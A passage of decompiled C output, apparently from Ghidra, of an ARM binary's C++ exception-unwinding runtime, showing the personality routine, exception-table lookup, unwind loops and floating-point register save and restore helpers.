              return 6;
            }
          }
        }
        else {
          uVar6 = *(uint *)(param_2 + 0x20);
          FUN_00009238(param_3,0,0xd,0,&uStack_30);
          if ((uVar6 == uStack_30) && (puVar8 == *(uint **)(param_2 + 0x28))) {
            uStack_30 = FUN_000092d0(puVar8);
            FUN_00009284(param_3,0,0xf,0,&uStack_30);
LAB_000096d0:
            uVar5 = 0;
            uStack_30 = param_2;
            goto LAB_0000978c;
          }
        }
        puVar10 = puVar10 + 3;
      }
      if (uVar6 != 0) {
        if (uVar6 != 2) {
          return 9;
        }
        uVar6 = *puVar8 & 0x7fffffff;
        if (uVar9 == 0) {
          if ((bVar2) && ((param_1 & 8) == 0 || uVar6 == 0)) {
            uStack_58 = 0;
            puVar7 = puVar8;
            do {
              if (uStack_58 == uVar6) goto LAB_0000960c;
              puVar7 = puVar7 + 1;
              uStack_58 = uStack_58 + 1;
              uVar5 = 0;
              if (*puVar7 != 0) {
                uVar5 = *(undefined4 *)((int)puVar7 + *puVar7);
              }
              aiStack_2c[0] = iVar4;
              iVar3 = __cxa_type_match(param_2,uVar5,0,aiStack_2c);
            } while (iVar3 == 0);
          }
        }
        else {
          uVar12 = *(uint *)(param_2 + 0x20);
          FUN_00009238(param_3,0,0xd,0,&uStack_30);
          if ((uVar12 == uStack_30) && (puVar8 == *(uint **)(param_2 + 0x28))) {
            *(uint **)(param_2 + 0x34) = puVar10 + 2;
            *(uint *)(param_2 + 0x28) = uVar6;
            *(undefined4 *)(param_2 + 0x2c) = 0;
            *(undefined4 *)(param_2 + 0x30) = 4;
            if (-1 < (int)*puVar8) {
              uStack_30 = FUN_000092d0(puVar8 + uVar6 + 1);
              FUN_00009284(param_3,0,0xf,0,&uStack_30);
              goto LAB_000096d0;
            }
            bVar11 = true;
          }
        }
        if ((int)*puVar8 < 0) {
          puVar8 = puVar10 + 2;
        }
        puVar10 = puVar8 + uVar6 + 1;
        goto LAB_0000970c;
      }
      if (uVar9 == 0) {
        bVar2 = false;
      }
      puVar10 = puVar10 + 2;
    } while (!bVar2);
    uVar6 = FUN_000092d0(puVar8);
    *(uint **)(param_2 + 0x38) = puVar10;
    iVar4 = __cxa_begin_cleanup(param_2);
    if (iVar4 != 0) {
      uVar5 = 0xf;
      uStack_30 = uVar6;
      goto LAB_0000978c;
    }
  }
  else {
    bVar11 = false;
LAB_00009718:
    iVar4 = FUN_0000a370(param_3,&iStack_3c);
    if (iVar4 == 0) {
      if (!bVar11) {
        return 8;
      }
      FUN_00009238(param_3,0,0xf,0,&uStack_30);
      FUN_00009284(param_3,0,0xe,0,&uStack_30);
      uVar5 = 0xf;
      uStack_30 = *(uint *)(DAT_000097a4 + 0x977c);
LAB_0000978c:
      FUN_00009284(param_3,0,uVar5,0,&uStack_30);
      return 7;
    }
  }
  return 9;
}


/* === __aeabi_unwind_cpp_pr0 @ 000097b8 === */

/* WARNING: Removing unreachable block (ram,0x00009364) */
/* WARNING: Removing unreachable block (ram,0x000093c8) */
/* WARNING: Removing unreachable block (ram,0x000093e0) */

undefined4 __aeabi_unwind_cpp_pr0(uint param_1,uint param_2,undefined4 param_3)

{
  ushort uVar1;
  bool bVar2;
  int iVar3;
  int iVar4;
  undefined4 uVar5;
  uint *puVar6;
  uint *puVar7;
  uint uVar8;
  uint *puVar9;
  uint uVar10;
  bool bVar11;
  uint uVar12;
  uint local_58;
  int local_3c;
  uint *local_38;
  undefined1 local_34;
  undefined1 local_33;
  uint local_30;
  int local_2c [2];
  
  uVar8 = param_1 & 3;
  local_38 = (uint *)(*(int **)(param_2 + 0x4c) + 1);
  local_3c = **(int **)(param_2 + 0x4c) << 8;
  local_34 = 3;
  local_33 = 0;
  puVar9 = local_38;
  if (uVar8 == 2) {
    puVar9 = *(uint **)(param_2 + 0x38);
  }
  if ((*(uint *)(param_2 + 0x50) & 1) == 0) {
    iVar4 = param_2 + 0x58;
    bVar11 = false;
LAB_0000970c:
    do {
      while( true ) {
        if (*puVar9 == 0) goto LAB_00009718;
        uVar1 = *(ushort *)((int)puVar9 + 2);
        uVar10 = *puVar9;
        puVar7 = puVar9 + 1;
        uVar12 = (uVar1 & 0xfffffffe) + *(int *)(param_2 + 0x48);
        FUN_00009238(param_3,0,0xf,0,&local_30);
        if (local_30 < uVar12) {
          bVar2 = false;
        }
        else if (local_30 < uVar12 + ((ushort)uVar10 & 0xfffffffe)) {
          bVar2 = true;
        }
        else {
          bVar2 = false;
        }
        uVar10 = (ushort)uVar10 & 1 | (uVar1 & 1) << 1;
        if (uVar10 != 1) break;
        if (uVar8 == 0) {
          if (bVar2) {
            uVar10 = puVar9[2];
            if (uVar10 == 0xfffffffe) {
              return 9;
            }
            local_2c[0] = iVar4;
            if (uVar10 != 0xffffffff) {
              if (uVar10 == 0) {
                uVar5 = 0;
              }
              else {
                uVar5 = *(undefined4 *)((int)puVar9 + uVar10 + 8);
              }
              iVar3 = __cxa_type_match(param_2,uVar5,*puVar7 >> 0x1f,local_2c);
              if (iVar3 == 0) {
                local_2c[0] = 0;
              }
            }
            if (local_2c[0] != 0) {
LAB_0000960c:
              FUN_00009238(param_3,0,0xd,0,&local_30);
              *(uint **)(param_2 + 0x28) = puVar7;
              *(uint *)(param_2 + 0x20) = local_30;
              *(int *)(param_2 + 0x24) = local_2c[0];
              return 6;
            }
          }
        }
        else {
          uVar10 = *(uint *)(param_2 + 0x20);
          FUN_00009238(param_3,0,0xd,0,&local_30);
          if ((uVar10 == local_30) && (puVar7 == *(uint **)(param_2 + 0x28))) {
            local_30 = FUN_000092d0(puVar7);
            FUN_00009284(param_3,0,0xf,0,&local_30);
LAB_000096d0:
            uVar5 = 0;
            local_30 = param_2;
            goto LAB_0000978c;
          }
        }
        puVar9 = puVar9 + 3;
      }
      if (uVar10 != 0) {
        if (uVar10 != 2) {
          return 9;
        }
        uVar10 = *puVar7 & 0x7fffffff;
        if (uVar8 == 0) {
          if ((bVar2) && ((param_1 & 8) == 0 || uVar10 == 0)) {
            local_58 = 0;
            puVar6 = puVar7;
            do {
              if (local_58 == uVar10) goto LAB_0000960c;
              puVar6 = puVar6 + 1;
              local_58 = local_58 + 1;
              uVar5 = 0;
              if (*puVar6 != 0) {
                uVar5 = *(undefined4 *)((int)puVar6 + *puVar6);
              }
              local_2c[0] = iVar4;
              iVar3 = __cxa_type_match(param_2,uVar5,0,local_2c);
            } while (iVar3 == 0);
          }
        }
        else {
          uVar12 = *(uint *)(param_2 + 0x20);
          FUN_00009238(param_3,0,0xd,0,&local_30);
          if ((uVar12 == local_30) && (puVar7 == *(uint **)(param_2 + 0x28))) {
            *(uint **)(param_2 + 0x34) = puVar9 + 2;
            *(uint *)(param_2 + 0x28) = uVar10;
            *(undefined4 *)(param_2 + 0x2c) = 0;
            *(undefined4 *)(param_2 + 0x30) = 4;
            if (-1 < (int)*puVar7) {
              local_30 = FUN_000092d0(puVar7 + uVar10 + 1);
              FUN_00009284(param_3,0,0xf,0,&local_30);
              goto LAB_000096d0;
            }
            bVar11 = true;
          }
        }
        if ((int)*puVar7 < 0) {
          puVar7 = puVar9 + 2;
        }
        puVar9 = puVar7 + uVar10 + 1;
        goto LAB_0000970c;
      }
      if (uVar8 == 0) {
        bVar2 = false;
      }
      puVar9 = puVar9 + 2;
    } while (!bVar2);
    uVar8 = FUN_000092d0(puVar7);
    *(uint **)(param_2 + 0x38) = puVar9;
    iVar4 = __cxa_begin_cleanup(param_2);
    if (iVar4 != 0) {
      uVar5 = 0xf;
      local_30 = uVar8;
      goto LAB_0000978c;
    }
  }
  else {
    bVar11 = false;
LAB_00009718:
    iVar4 = FUN_0000a370(param_3,&local_3c);
    if (iVar4 == 0) {
      if (!bVar11) {
        return 8;
      }
      FUN_00009238(param_3,0,0xf,0,&local_30);
      FUN_00009284(param_3,0,0xe,0,&local_30);
      uVar5 = 0xf;
      local_30 = *(uint *)(DAT_000097a4 + 0x977c);
LAB_0000978c:
      FUN_00009284(param_3,0,uVar5,0,&local_30);
      return 7;
    }
  }
  return 9;
}


/* === FUN_000097c0 @ 000097c0 === */

undefined4 FUN_000097c0(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  undefined4 uVar5;
  int iVar6;
  uint uVar7;
  int iVar8;
  uint uVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int local_2c [2];
  
  iVar8 = DAT_00009974 + 0x97d4;
  uVar9 = param_2 - 2;
  if (*(int *)(iVar8 + DAT_00009978) == 0) {
    iVar2 = *(int *)(iVar8 + DAT_00009980);
    local_2c[0] = *(int *)(iVar8 + DAT_0000997c) - iVar2 >> 3;
  }
  else {
    iVar2 = __gnu_Unwind_Find_exidx(uVar9,local_2c);
    if (iVar2 == 0) {
      *(undefined4 *)(param_1 + 0x10) = 0;
      return 9;
    }
  }
  if (local_2c[0] != 0) {
    iVar6 = local_2c[0] + -1;
    iVar11 = 0;
    iVar12 = iVar6;
    do {
      while( true ) {
        iVar1 = (iVar12 + iVar11) / 2;
        iVar10 = iVar2 + iVar1 * 8;
        uVar3 = FUN_000092d0(iVar10);
        uVar7 = 0xffffffff;
        if (iVar1 != iVar6) {
          iVar4 = FUN_000092d0(iVar2 + (iVar1 + 1) * 8);
          uVar7 = iVar4 - 1;
        }
        if (uVar3 <= uVar9) break;
        iVar12 = iVar1 + -1;
        if (iVar1 == iVar11) goto LAB_0000994c;
      }
      iVar11 = iVar1 + 1;
    } while (uVar7 < uVar9);
    if (iVar10 != 0) {
      uVar5 = FUN_000092d0(iVar10);
      *(undefined4 *)(param_1 + 0x48) = uVar5;
      if (*(int *)(iVar10 + 4) == 1) {
        *(undefined4 *)(param_1 + 0x10) = 0;
        return 5;
      }
      if (*(int *)(iVar10 + 4) < 0) {
        *(int *)(param_1 + 0x4c) = iVar10 + 4;
        *(undefined4 *)(param_1 + 0x50) = 1;
      }
      else {
        uVar5 = FUN_000092d0();
        *(undefined4 *)(param_1 + 0x50) = 0;
        *(undefined4 *)(param_1 + 0x4c) = uVar5;
      }
      if (-1 < (int)**(uint **)(param_1 + 0x4c)) {
        uVar5 = FUN_000092d0();
        *(undefined4 *)(param_1 + 0x10) = uVar5;
        return 0;
      }
      uVar9 = **(uint **)(param_1 + 0x4c) >> 0x18 & 0xf;
      iVar2 = DAT_00009984;
      if (((uVar9 == 0) || (iVar2 = DAT_00009988, uVar9 == 1)) || (iVar2 = DAT_0000998c, uVar9 == 2)
         ) {
        *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)(iVar8 + iVar2);
        return 0;
      }
    }
  }
LAB_0000994c:
  *(undefined4 *)(param_1 + 0x10) = 0;
  return 9;
}


/* === FUN_00009990 @ 00009990 === */

void FUN_00009990(uint *param_1)

{
  if ((*param_1 & 1) == 0) {
    if ((*param_1 & 2) == 0) {
      FUN_0000a110(param_1 + 0x12);
    }
    else {
      FUN_0000a120();
    }
  }
  if ((*param_1 & 4) == 0) {
    FUN_0000a130(param_1 + 0x34);
  }
  if ((*param_1 & 8) == 0) {
    FUN_0000a140(param_1 + 0x6c);
  }
  if ((*param_1 & 0x10) != 0) {
    return;
  }
  FUN_0000a1c8(param_1 + 0x8c);
  return;
}


/* === FUN_000099fc @ 000099fc === */

int FUN_000099fc(code *param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  undefined4 local_2c0;
  undefined4 local_2bc;
  undefined4 uStack_2b8;
  undefined4 uStack_2b4;
  undefined4 uStack_2b0;
  undefined4 local_2ac;
  undefined4 uStack_2a8;
  undefined4 uStack_2a4;
  undefined4 uStack_2a0;
  undefined4 local_29c;
  undefined4 uStack_298;
  undefined4 uStack_294;
  undefined4 uStack_290;
  undefined4 local_28c;
  undefined4 uStack_288;
  undefined4 uStack_284;
  undefined4 local_280;
  undefined1 auStack_80 [16];
  code *local_70;
  undefined1 *local_24 [2];
  
  *(undefined4 *)(param_3 + 0x40) = *(undefined4 *)(param_3 + 0x3c);
  local_2bc = *(undefined4 *)(param_3 + 4);
  uStack_2b8 = *(undefined4 *)(param_3 + 8);
  uStack_2b4 = *(undefined4 *)(param_3 + 0xc);
  uStack_2b0 = *(undefined4 *)(param_3 + 0x10);
  local_2ac = *(undefined4 *)(param_3 + 0x14);
  uStack_2a8 = *(undefined4 *)(param_3 + 0x18);
  uStack_2a4 = *(undefined4 *)(param_3 + 0x1c);
  uStack_2a0 = *(undefined4 *)(param_3 + 0x20);
  local_29c = *(undefined4 *)(param_3 + 0x24);
  uStack_298 = *(undefined4 *)(param_3 + 0x28);
  uStack_294 = *(undefined4 *)(param_3 + 0x2c);
  uStack_290 = *(undefined4 *)(param_3 + 0x30);
  local_28c = *(undefined4 *)(param_3 + 0x34);
  uStack_288 = *(undefined4 *)(param_3 + 0x38);
  uStack_284 = *(undefined4 *)(param_3 + 0x3c);
  local_280 = *(undefined4 *)(param_3 + 0x40);
  local_2c0 = 0xffffffff;
  do {
    iVar1 = FUN_000097c0(auStack_80,local_280);
    if (iVar1 != 0) {
LAB_00009ab8:
      iVar1 = 9;
      break;
    }
    local_24[0] = auStack_80;
    FUN_00009284(&local_2c0,0,0xc,0,local_24);
    iVar1 = (*param_1)(&local_2c0,param_2);
    if (iVar1 != 0) goto LAB_00009ab8;
    iVar1 = (*local_70)(8,auStack_80,&local_2c0);
  } while (iVar1 != 9 && iVar1 != 5);
  FUN_00009990(&local_2c0);
  return iVar1;
}


/* === FUN_00009ad0 @ 00009ad0 === */

int FUN_00009ad0(int param_1,int param_2,int param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  code *pcVar4;
  uint uVar5;
  undefined4 uVar6;
  undefined1 auStack_4a8 [56];
  undefined4 local_470;
  undefined4 local_268;
  undefined4 local_264;
  undefined4 uStack_260;
  undefined4 uStack_25c;
  undefined4 uStack_258;
  undefined4 local_254;
  undefined4 uStack_250;
  undefined4 uStack_24c;
  undefined4 uStack_248;
  undefined4 local_244;
  undefined4 uStack_240;
  undefined4 uStack_23c;
  undefined4 uStack_238;
  undefined4 local_234;
  undefined4 local_230;
  undefined4 uStack_22c;
  undefined4 local_228;
  undefined4 local_224;
  
  local_264 = *(undefined4 *)(param_2 + 4);
  uStack_260 = *(undefined4 *)(param_2 + 8);
  uStack_25c = *(undefined4 *)(param_2 + 0xc);
  uStack_258 = *(undefined4 *)(param_2 + 0x10);
  local_254 = *(undefined4 *)(param_2 + 0x14);
  uStack_250 = *(undefined4 *)(param_2 + 0x18);
  uStack_24c = *(undefined4 *)(param_2 + 0x1c);
  uStack_248 = *(undefined4 *)(param_2 + 0x20);
  local_244 = *(undefined4 *)(param_2 + 0x24);
  uStack_240 = *(undefined4 *)(param_2 + 0x28);
  uStack_23c = *(undefined4 *)(param_2 + 0x2c);
  uStack_238 = *(undefined4 *)(param_2 + 0x30);
  local_234 = *(undefined4 *)(param_2 + 0x34);
  local_230 = *(undefined4 *)(param_2 + 0x38);
  uStack_22c = *(undefined4 *)(param_2 + 0x3c);
  local_228 = *(undefined4 *)(param_2 + 0x40);
  iVar3 = 0;
  pcVar4 = *(code **)(param_1 + 0xc);
  uVar6 = *(undefined4 *)(param_1 + 0x18);
  local_268 = 0;
  do {
    iVar1 = FUN_000097c0(param_1,local_228);
    if (param_3 == 0) {
      uVar5 = 9;
    }
    else {
      uVar5 = 10;
    }
    if (iVar1 == 0) {
      *(undefined4 *)(param_1 + 0x14) = local_228;
      memcpy(auStack_4a8,&local_268,0x240);
      iVar3 = (**(code **)(param_1 + 0x10))(uVar5,param_1,auStack_4a8);
      local_224 = local_470;
    }
    else {
      uVar5 = uVar5 | 0x10;
      local_224 = local_230;
    }
    iVar2 = (*pcVar4)(1,uVar5,param_1,param_1,&local_268,uVar6);
    if (iVar2 != 0) {
      return 9;
    }
    if (iVar1 != 0) {
      return iVar1;
    }
    memcpy(&local_268,auStack_4a8,0x240);
    param_3 = 0;
  } while (iVar3 == 8);
  if (iVar3 == 7) {
    FUN_0000a0fc(&local_264);
  }
  return 9;
}


/* === FUN_00009c08 @ 00009c08 === */

void FUN_00009c08(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined8 uVar4;
  undefined4 local_268;
  undefined4 local_264;
  undefined4 uStack_260;
  undefined4 uStack_25c;
  undefined4 uStack_258;
  undefined4 local_254;
  undefined4 uStack_250;
  undefined4 uStack_24c;
  undefined4 uStack_248;
  undefined4 local_244;
  undefined4 uStack_240;
  undefined4 uStack_23c;
  undefined4 uStack_238;
  undefined4 local_234;
  undefined4 uStack_230;
  undefined4 uStack_22c;
  undefined4 local_228;
  int iStack_24;
  int iStack_20;
  
  do {
    iVar1 = FUN_000097c0(param_1,*(undefined4 *)(param_2 + 0x40));
    if (iVar1 != 0) goto LAB_00009c54;
    *(undefined4 *)(param_1 + 0x14) = *(undefined4 *)(param_2 + 0x40);
    iVar1 = (**(code **)(param_1 + 0x10))(1,param_1,param_2);
  } while (iVar1 == 8);
  if (iVar1 != 7) {
LAB_00009c54:
                    /* WARNING: Subroutine does not return */
    abort();
  }
  uVar4 = FUN_0000a0fc(param_2 + 4);
  iVar3 = (int)((ulonglong)uVar4 >> 0x20);
  iVar1 = (int)uVar4;
  *(undefined4 *)(iVar3 + 0x40) = *(undefined4 *)(iVar3 + 0x3c);
  local_264 = *(undefined4 *)(iVar3 + 4);
  uStack_260 = *(undefined4 *)(iVar3 + 8);
  uStack_25c = *(undefined4 *)(iVar3 + 0xc);
  uStack_258 = *(undefined4 *)(iVar3 + 0x10);
  local_254 = *(undefined4 *)(iVar3 + 0x14);
  uStack_250 = *(undefined4 *)(iVar3 + 0x18);
  uStack_24c = *(undefined4 *)(iVar3 + 0x1c);
  uStack_248 = *(undefined4 *)(iVar3 + 0x20);
  local_244 = *(undefined4 *)(iVar3 + 0x24);
  uStack_240 = *(undefined4 *)(iVar3 + 0x28);
  uStack_23c = *(undefined4 *)(iVar3 + 0x2c);
  uStack_238 = *(undefined4 *)(iVar3 + 0x30);
  local_234 = *(undefined4 *)(iVar3 + 0x34);
  uStack_230 = *(undefined4 *)(iVar3 + 0x38);
  uStack_22c = *(undefined4 *)(iVar3 + 0x3c);
  local_228 = *(undefined4 *)(iVar3 + 0x40);
  local_268 = 0xffffffff;
  iStack_24 = param_2;
  iStack_20 = param_1;
  do {
    iVar2 = FUN_000097c0(iVar1,local_228);
    if (iVar2 != 0) goto LAB_00009cf8;
    iVar2 = (**(code **)(iVar1 + 0x10))(0,iVar1,&local_268);
  } while (iVar2 == 8);
  FUN_00009990(&local_268);
  if (iVar2 == 6) {
    FUN_00009c08(iVar1,iVar3);
  }
LAB_00009cf8:
                    /* WARNING: Could not recover jumptable at 0x00009d00. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)0x9c60)(9);
  return;
}


/* === FUN_00009d90 @ 00009d90 === */

undefined4 FUN_00009d90(uint *param_1,undefined4 param_2,uint param_3,int param_4)

{
  uint *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  bool bVar8;
  bool bVar9;
  undefined4 auStack_1b8 [34];
  undefined4 auStack_130 [32];
  undefined4 local_b0 [32];
  undefined4 local_30 [5];
  
  switch(param_2) {
  case 0:
    if (param_4 != 0) {
      return 2;
    }
    puVar1 = (uint *)param_1[0xe];
    uVar6 = 0;
    do {
      if ((param_3 & 0xffff & 1 << (uVar6 & 0xff)) != 0) {
        param_1[uVar6 + 1] = *puVar1;
        puVar1 = puVar1 + 1;
      }
      uVar6 = uVar6 + 1;
    } while (uVar6 != 0x10);
    if ((param_3 & 0x2000) != 0) {
      return 0;
    }
    param_1[0xe] = (uint)puVar1;
    return 0;
  case 1:
    if (param_4 != 1 && param_4 != 5) {
      return 2;
    }
    uVar6 = param_3 & 0xffff;
    param_3 = param_3 >> 0x10;
    if (param_4 == 1) {
      uVar3 = 0x10;
    }
    else {
      uVar3 = 0x20;
    }
    uVar2 = uVar6 + param_3;
    if (uVar3 < uVar2) {
      return 2;
    }
    bVar8 = param_4 == 1;
    if (param_3 >= 0x10 && bVar8) {
      return 2;
    }
    uVar3 = uVar6;
    if ((param_3 < 0x10) && (uVar3 = 0, 0x10 < uVar2)) {
      uVar3 = uVar2 - 0x10;
    }
    if (uVar3 != 0 && param_4 != 5) {
      return 2;
    }
    if ((param_3 < 0x10) && (uVar2 = *param_1, (uVar2 & 1) != 0)) {
      *param_1 = uVar2 & 0xfffffffe;
      if (param_4 == 5) {
        *param_1 = uVar2 & 0xfffffffe | 2;
        FUN_0000a128();
      }
      else {
        *param_1 = uVar2 & 0xfffffffc;
        FUN_0000a118(param_1 + 0x12);
      }
    }
    if ((0 < (int)uVar3) && ((*param_1 & 4) != 0)) {
      *param_1 = *param_1 & 0xfffffffb;
      FUN_0000a138(param_1 + 0x34);
    }
    if (bVar8) {
      FUN_0000a118(auStack_1b8);
    }
    else {
      if (param_3 < 0x10) {
        FUN_0000a128(auStack_1b8);
      }
      if (uVar3 == 0) goto LAB_00009f2c;
      FUN_0000a138(local_b0);
    }
    if (0 < (int)uVar3) {
      uVar6 = 0x10 - param_3;
    }
LAB_00009f2c:
    uVar2 = param_1[0xe];
    if (0 < (int)uVar6) {
      iVar7 = uVar6 * 2;
      iVar5 = 0;
      while (bVar9 = iVar7 != 0, iVar7 = iVar7 + -1, bVar9) {
        *(undefined4 *)((int)auStack_1b8 + iVar5 + param_3 * 8) = *(undefined4 *)(iVar5 + uVar2);
        iVar5 = iVar5 + 4;
      }
      uVar2 = uVar2 + uVar6 * 8;
    }
    if (0 < (int)uVar3) {
      uVar6 = param_3;
      if (param_3 < 0x10) {
        uVar6 = 0x10;
      }
      iVar7 = uVar3 * 2;
      iVar5 = 0;
      while (bVar9 = iVar7 != 0, iVar7 = iVar7 + -1, bVar9) {
        *(undefined4 *)((int)local_b0 + iVar5 + (uVar6 - 0x10) * 8) = *(undefined4 *)(uVar2 + iVar5)
        ;
        iVar5 = iVar5 + 4;
      }
      uVar2 = uVar2 + uVar3 * 8;
    }
    if (bVar8) {
      uVar2 = uVar2 + 4;
    }
    param_1[0xe] = uVar2;
    if (bVar8) {
      FUN_0000a110(auStack_1b8);
    }
    else {
      if (param_3 < 0x10) {
        FUN_0000a120(auStack_1b8);
      }
      if (0 < (int)uVar3) {
        FUN_0000a130(local_b0);
      }
    }
    return 0;
  case 2:
    return 1;
  case 3:
    if (param_4 == 3) {
      uVar6 = param_3 & 0xffff;
      if (uVar6 + (param_3 >> 0x10) < 0x11) {
        if ((*param_1 & 8) != 0) {
          *param_1 = *param_1 & 0xfffffff7;
          FUN_0000a184(param_1 + 0x6c);
        }
        FUN_0000a184(auStack_130);
        uVar3 = param_1[0xe];
        iVar5 = 0;
        for (iVar7 = uVar6 * 2; iVar7 != 0; iVar7 = iVar7 + -1) {
          *(undefined4 *)((int)auStack_130 + iVar5 + (param_3 >> 0x10) * 8) =
               *(undefined4 *)(iVar5 + uVar3);
          iVar5 = iVar5 + 4;
        }
        param_1[0xe] = uVar3 + uVar6 * 8;
        FUN_0000a140(auStack_130);
        return 0;
      }
    }
    break;
  case 4:
    bVar8 = param_3 == 0x10;
    if (param_3 < 0x11) {
      bVar8 = param_4 == 0;
    }
    if (bVar8) {
      if ((*param_1 & 0x10) != 0) {
        *param_1 = *param_1 & 0xffffffef;
        FUN_0000a1dc(param_1 + 0x8c);
      }
      FUN_0000a1dc(local_30);
      puVar4 = (undefined4 *)param_1[0xe];
      uVar6 = 0;
      do {
        if ((param_3 & 1 << (uVar6 & 0xff)) != 0) {
          local_30[uVar6] = *puVar4;
          puVar4 = puVar4 + 1;
        }
        uVar6 = uVar6 + 1;
      } while (uVar6 != 4);
      param_1[0xe] = (uint)puVar4;
      FUN_0000a1c8(local_30);
      return 0;
    }
  }
  return 2;
}


/* === FUN_0000a0fc @ 0000a0fc === */

undefined8 FUN_0000a0fc(undefined8 *param_1)

{
  return *param_1;
}


/* === FUN_0000a110 @ 0000a110 === */

undefined4 FUN_0000a110(undefined8 *param_1)

{
  return (int)*param_1;
}


/* === FUN_0000a118 @ 0000a118 === */

void FUN_0000a118(undefined8 *param_1)

{
  undefined8 in_d0;
  undefined8 in_d1;
  undefined8 in_d2;
  undefined8 in_d3;
  undefined8 in_d4;
  undefined8 in_d5;
  undefined8 in_d6;
  undefined8 in_d7;
  undefined8 unaff_d8;
  undefined8 unaff_d9;
  undefined8 unaff_d10;
  undefined8 unaff_d11;
  undefined8 unaff_d12;
  undefined8 unaff_d13;
  undefined8 unaff_d14;
  undefined8 unaff_d15;
  
  *param_1 = in_d0;
  param_1[1] = in_d1;
  param_1[2] = in_d2;
  param_1[3] = in_d3;
  param_1[4] = in_d4;
  param_1[5] = in_d5;
  param_1[6] = in_d6;
  param_1[7] = in_d7;
  param_1[8] = unaff_d8;
  param_1[9] = unaff_d9;
  param_1[10] = unaff_d10;
  param_1[0xb] = unaff_d11;
  param_1[0xc] = unaff_d12;
  param_1[0xd] = unaff_d13;
  param_1[0xe] = unaff_d14;
  param_1[0xf] = unaff_d15;
  return;
}


/* === FUN_0000a120 @ 0000a120 === */

undefined4 FUN_0000a120(undefined8 *param_1)

{
  return (int)*param_1;
}


/* === FUN_0000a128 @ 0000a128 === */

void FUN_0000a128(undefined8 *param_1)

{
  undefined8 in_d0;
  undefined8 in_d1;
  undefined8 in_d2;
  undefined8 in_d3;
  undefined8 in_d4;
  undefined8 in_d5;
  undefined8 in_d6;
  undefined8 in_d7;
  undefined8 unaff_d8;
  undefined8 unaff_d9;
  undefined8 unaff_d10;
  undefined8 unaff_d11;
  undefined8 unaff_d12;
  undefined8 unaff_d13;
  undefined8 unaff_d14;
  undefined8 unaff_d15;
  
  *param_1 = in_d0;
  param_1[1] = in_d1;
  param_1[2] = in_d2;
  param_1[3] = in_d3;
  param_1[4] = in_d4;
  param_1[5] = in_d5;
  param_1[6] = in_d6;
  param_1[7] = in_d7;
  param_1[8] = unaff_d8;
  param_1[9] = unaff_d9;
  param_1[10] = unaff_d10;
  param_1[0xb] = unaff_d11;
  param_1[0xc] = unaff_d12;
  param_1[0xd] = unaff_d13;
  param_1[0xe] = unaff_d14;
  param_1[0xf] = unaff_d15;
  return;
}


/* === FUN_0000a130 @ 0000a130 === */

void FUN_0000a130(void)

{
  return;
}


/* === FUN_0000a138 @ 0000a138 === */

void FUN_0000a138(undefined8 *param_1)

{
  undefined8 in_d16;
  undefined8 in_d17;
  undefined8 in_d18;
  undefined8 in_d19;
  undefined8 in_d20;
  undefined8 in_d21;
  undefined8 in_d22;
  undefined8 in_d23;
  undefined8 in_d24;
  undefined8 in_d25;
  undefined8 in_d26;
  undefined8 in_d27;
  undefined8 in_d28;
  undefined8 in_d29;
  undefined8 in_d30;
  undefined8 in_d31;
  
  *param_1 = in_d16;
  param_1[1] = in_d17;
  param_1[2] = in_d18;
  param_1[3] = in_d19;
  param_1[4] = in_d20;
  param_1[5] = in_d21;
  param_1[6] = in_d22;
  param_1[7] = in_d23;
  param_1[8] = in_d24;
  param_1[9] = in_d25;
  param_1[10] = in_d26;
  param_1[0xb] = in_d27;
  param_1[0xc] = in_d28;
  param_1[0xd] = in_d29;
  param_1[0xe] = in_d30;
  param_1[0xf] = in_d31;
  return;
}


/* === FUN_0000a140 @ 0000a140 === */

int FUN_0000a140(int param_1)

{
  undefined4 in_cr0;
  undefined4 in_cr1;
  undefined4 in_cr2;
  undefined4 in_cr3;
  undefined4 in_cr4;
  undefined4 in_cr5;
  undefined4 in_cr6;
  undefined4 in_cr7;
  undefined4 in_cr8;
  undefined4 in_cr9;
  undefined4 in_cr10;
  undefined4 in_cr11;
  undefined4 in_cr12;
  undefined4 in_cr13;
  undefined4 in_cr14;
  undefined4 in_cr15;
  
  coprocessor_loadlong(1,in_cr0,param_1);
  coprocessor_loadlong(1,in_cr1,param_1 + 8);
  coprocessor_loadlong(1,in_cr2,param_1 + 0x10);
  coprocessor_loadlong(1,in_cr3,param_1 + 0x18);
  coprocessor_loadlong(1,in_cr4,param_1 + 0x20);
  coprocessor_loadlong(1,in_cr5,param_1 + 0x28);
  coprocessor_loadlong(1,in_cr6,param_1 + 0x30);
  coprocessor_loadlong(1,in_cr7,param_1 + 0x38);
  coprocessor_loadlong(1,in_cr8,param_1 + 0x40);
  coprocessor_loadlong(1,in_cr9,param_1 + 0x48);
  coprocessor_loadlong(1,in_cr10,param_1 + 0x50);
  coprocessor_loadlong(1,in_cr11,param_1 + 0x58);
  coprocessor_loadlong(1,in_cr12,param_1 + 0x60);
  coprocessor_loadlong(1,in_cr13,param_1 + 0x68);
  coprocessor_loadlong(1,in_cr14,param_1 + 0x70);
  coprocessor_loadlong(1,in_cr15,param_1 + 0x78);
  return param_1 + 0x80;
}


/* === FUN_0000a184 @ 0000a184 === */

int FUN_0000a184(int param_1)

{
  undefined4 in_cr0;
  undefined4 in_cr1;
  undefined4 in_cr2;
  undefined4 in_cr3;
  undefined4 in_cr4;
  undefined4 in_cr5;
  undefined4 in_cr6;
  undefined4 in_cr7;
  undefined4 in_cr8;
  undefined4 in_cr9;
  undefined4 in_cr10;
  undefined4 in_cr11;
  undefined4 in_cr12;
  undefined4 in_cr13;
  undefined4 in_cr14;
  undefined4 in_cr15;
  
  coprocessor_storelong(1,in_cr0,param_1);
  coprocessor_storelong(1,in_cr1,param_1 + 8);
  coprocessor_storelong(1,in_cr2,param_1 + 0x10);
  coprocessor_storelong(1,in_cr3,param_1 + 0x18);
  coprocessor_storelong(1,in_cr4,param_1 + 0x20);
  coprocessor_storelong(1,in_cr5,param_1 + 0x28);
  coprocessor_storelong(1,in_cr6,param_1 + 0x30);
  coprocessor_storelong(1,in_cr7,param_1 + 0x38);
  coprocessor_storelong(1,in_cr8,param_1 + 0x40);
